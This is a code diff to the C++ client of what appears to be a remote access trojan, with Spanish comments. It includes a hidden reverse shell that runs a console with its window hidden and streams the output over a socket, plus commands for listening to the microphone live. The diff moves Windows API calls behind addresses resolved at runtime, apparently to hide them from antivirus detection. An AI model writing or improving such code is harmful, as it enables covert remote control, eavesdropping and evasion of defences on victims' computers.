@@ -118,6 +118,15 @@ Cliente::Cliente() {
         this->KERNEL32.pTerminateProcess     = (st_Kernel32::LPTERMINATEPROCESS)   wrapGetProcAddr(this->hKernel32DLL, "TerminateProcess");
         this->KERNEL32.pCloseHandle          = (st_Kernel32::LPCLOSEHANDLE)        wrapGetProcAddr(this->hKernel32DLL, "CloseHandle");
         this->KERNEL32.pGlobalMemoryStatusEx = (st_Kernel32::LPGLOBALMEMORYSTATUSEX)wrapGetProcAddr(this->hKernel32DLL, "GlobalMemoryStatusEx");
+        this->KERNEL32.pCopyFileA            = (st_Kernel32::LPCOPYFILEA)wrapGetProcAddr(this->hKernel32DLL, "CopyFileA");
+        this->KERNEL32.pReadFile = (st_Kernel32::LPREADFILE)wrapGetProcAddr(this->hKernel32DLL, "ReadFile");
+        this->KERNEL32.pWriteFile = (st_Kernel32::LPWRITEFILE)wrapGetProcAddr(this->hKernel32DLL, "WriteFile");
+        this->KERNEL32.pDeleteFileA = (st_Kernel32::LPDELETEFILEA)wrapGetProcAddr(this->hKernel32DLL, "DeleteFileA");
+    
+        //Reverse shell
+        this->KERNEL32.pCreatePipe = (st_Kernel32::LPCREATEPIPE)wrapGetProcAddr(this->hKernel32DLL, "CreatePipe");
+        this->KERNEL32.pPeekNamedPipe = (st_Kernel32::LPPEEKNAMEDPIPE)wrapGetProcAddr(this->hKernel32DLL, "PeekNamedPipe");
+
     }
 
     if (this->hAdvapi32DLL) {
@@ -141,7 +150,9 @@ Cliente::Cliente() {
         this->PSAPI.pGetModuleFileNameExA = (st_PsApi::LPGETMODULEFILNAMEEX)wrapGetProcAddr(this->hPsApiDLL, "GetModuleFileNameExA");
 
     }
-    
+ 
+    //this->mod_Fun = new modFun();
+
 }
 
 Cliente::~Cliente() {
@@ -648,7 +659,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Lista de dispositivos de entrada (mic)
     if (iComando == EnumComandos::Mic_Refre_Dispositivos) {
         if (this->mod_Mic == nullptr) {
-            this->mod_Mic = new Mod_Mic(this);
+            this->mod_Mic = new Mod_Mic();
         }
 
         this->mod_Mic->sckSocket = this->sckSocket;
@@ -659,7 +670,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Escuchar mic en tiempo real
     if (iComando == EnumComandos::Mic_Iniciar_Escucha) {
         if (this->mod_Mic == nullptr) {
-            this->mod_Mic = new Mod_Mic(this);
+            this->mod_Mic = new Mod_Mic();
         }
         if (!this->mod_Mic->isLiveMic) {
             this->mod_Mic->sckSocket = this->sckSocket;
@@ -1498,8 +1509,8 @@ std::string Cliente::ObtenerDown() {
     }
 }
 
-//Reverse shell
 
+//Reverse shell
 bool ReverseShell::SpawnShell(const char* pstrComando) {
     __DBG_("Lanzando " + std::string(pstrComando));
 
@@ -1508,33 +1519,41 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.lpSecurityDescriptor = nullptr;
     sa.bInheritHandle = true;
-    if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
-        cCliente->m_RemoteLog("[SHELL] CreatePipe error: " + std::to_string(GetLastError()));
-        __DBG_("Error creando tuberias");
-        return false;
-    }
-    STARTUPINFO si;
-    GetStartupInfo(&si);
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    si.hStdOutput = this->stdoutWr;
-    si.hStdError = this->stdoutWr;
-    si.hStdInput = this->stdinRd;
+    if (cCliente->KERNEL32.pCreatePipe) {
+        if (!cCliente->KERNEL32.pCreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !cCliente->KERNEL32.pCreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
+            cCliente->m_RemoteLog("[SHELL] CreatePipe error: " + std::to_string(GetLastError()));
+            __DBG_("Error creando tuberias");
+            return false;
+        }
+        STARTUPINFO si;
+        GetStartupInfo(&si);
+        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        si.hStdOutput = this->stdoutWr;
+        si.hStdError = this->stdoutWr;
+        si.hStdInput = this->stdinRd;
 
-    if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
-        cCliente->m_RemoteLog("[SHELL] CreateProcess error: " + std::to_string(GetLastError()));
-        __DBG_("No se pudo spawnear la shell");
-        return false;
+        if (cCliente->KERNEL32.pCreateProcessA) {
+            if (cCliente->KERNEL32.pCreateProcessA(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
+                cCliente->m_RemoteLog("[SHELL] CreateProcess error: " + std::to_string(GetLastError()));
+                __DBG_("No se pudo spawnear la shell");
+                return false;
+            }
+        }else {
+            return false;
+        }
+
+        //La shell esta corriendo
+        this->isRunning = true;
+        cCliente->m_RemoteLog("[SHELL] Corriendo...");
+        __DBG_("Running!");
+
+        this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
+        
+        return true;
     }
     
-    //La shell esta corriendo
-    this->isRunning = true;
-    cCliente->m_RemoteLog("[SHELL] Corriendo...");
-    __DBG_("Running!");
-    
-    this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
-    
-    return true;
+    return false;
 }
 
 void ReverseShell::StopShell() {
@@ -1552,22 +1571,27 @@ void ReverseShell::TerminarShell() {
 
     cCliente->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::Reverse_Shell_Finish);
     
-    TerminateProcess(this->pi.hProcess, 0);
-    if (this->stdinRd != nullptr) {
-        CloseHandle(this->stdinRd);
-        this->stdinRd = nullptr;
+    if (cCliente->KERNEL32.pTerminateProcess) {
+        cCliente->KERNEL32.pTerminateProcess(this->pi.hProcess, 0);
     }
-    if (this->stdinWr != nullptr) {
-        CloseHandle(this->stdinWr);
-        this->stdinWr = nullptr;
-    }
-    if (this->stdoutRd != nullptr) {
-        CloseHandle(this->stdoutRd);
-        this->stdoutRd = nullptr;
-    }
-    if (this->stdoutWr != nullptr) {
-        CloseHandle(this->stdoutWr);
-        this->stdoutWr = nullptr;
+    
+    if (cCliente->KERNEL32.pCloseHandle) {
+        if (this->stdinRd != nullptr) {
+            cCliente->KERNEL32.pCloseHandle(this->stdinRd);
+            this->stdinRd = nullptr;
+        }
+        if (this->stdinWr != nullptr) {
+            cCliente->KERNEL32.pCloseHandle(this->stdinWr);
+            this->stdinWr = nullptr;
+        }
+        if (this->stdoutRd != nullptr) {
+            cCliente->KERNEL32.pCloseHandle(this->stdoutRd);
+            this->stdoutRd = nullptr;
+        }
+        if (this->stdoutWr != nullptr) {
+            cCliente->KERNEL32.pCloseHandle(this->stdoutWr);
+            this->stdoutWr = nullptr;
+        }
     }
 }
 
@@ -1590,33 +1614,37 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             break;
         }
 
-        if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
-            if (dBytesReaded > 0) {
-                ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
-            }else {
-                std::this_thread::sleep_for(std::chrono::milliseconds(10));
-                continue;
-            }
-            for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
-                if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
-                    cBuffer2[dBytesToWrite++] = '\r';
+        if (cCliente->KERNEL32.pPeekNamedPipe) {
+            if (cCliente->KERNEL32.pPeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
+                if (dBytesReaded > 0) {
+                    if (cCliente->KERNEL32.pReadFile) {
+                        cCliente->KERNEL32.pReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
+                    }
+                }else {
+                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                    continue;
                 }
-                bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
-            }
-            cBuffer2[dBytesToWrite] = '\0';
+                for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
+                    if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
+                        cBuffer2[dBytesToWrite++] = '\r';
+                    }
+                    bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
+                }
+                cBuffer2[dBytesToWrite] = '\0';
 
-            int iEnviado = cCliente->cChunkSend(this->sckSocket, cBuffer2, dBytesToWrite, 0, true, nullptr, EnumComandos::Reverse_Shell_Salida);
-            std::this_thread::sleep_for(std::chrono::milliseconds(10));
-            if (iEnviado <= 0) {
-                //Desconectado o se perdio la conexion
+                int iEnviado = cCliente->cChunkSend(this->sckSocket, cBuffer2, dBytesToWrite, 0, true, nullptr, EnumComandos::Reverse_Shell_Salida);
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                if (iEnviado <= 0) {
+                    //Desconectado o se perdio la conexion
+                    this->StopShell();
+                    break;
+                }
+
+            }else {
+                //error peeknamedpipe
                 this->StopShell();
                 break;
             }
-
-        }else {
-            //error peeknamedpipe
-            this->StopShell();
-            break;
         }
     }
     __DBG_("[!]thLeerShell finalizada");
@@ -1629,10 +1657,12 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
 
     DWORD dBytesWrited = 0;
     //stdinWr tuberia de entrada
-    if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
-        cCliente->m_RemoteLog("[SHELL] WriteFile error: " + std::to_string(GetLastError()));
-        __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
-        this->StopShell();
+    if (cCliente->KERNEL32.pWriteFile) {
+        if (!cCliente->KERNEL32.pWriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
+            cCliente->m_RemoteLog("[SHELL] WriteFile error: " + std::to_string(GetLastError()));
+            __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
+            this->StopShell();
+        }
     }
 }
 
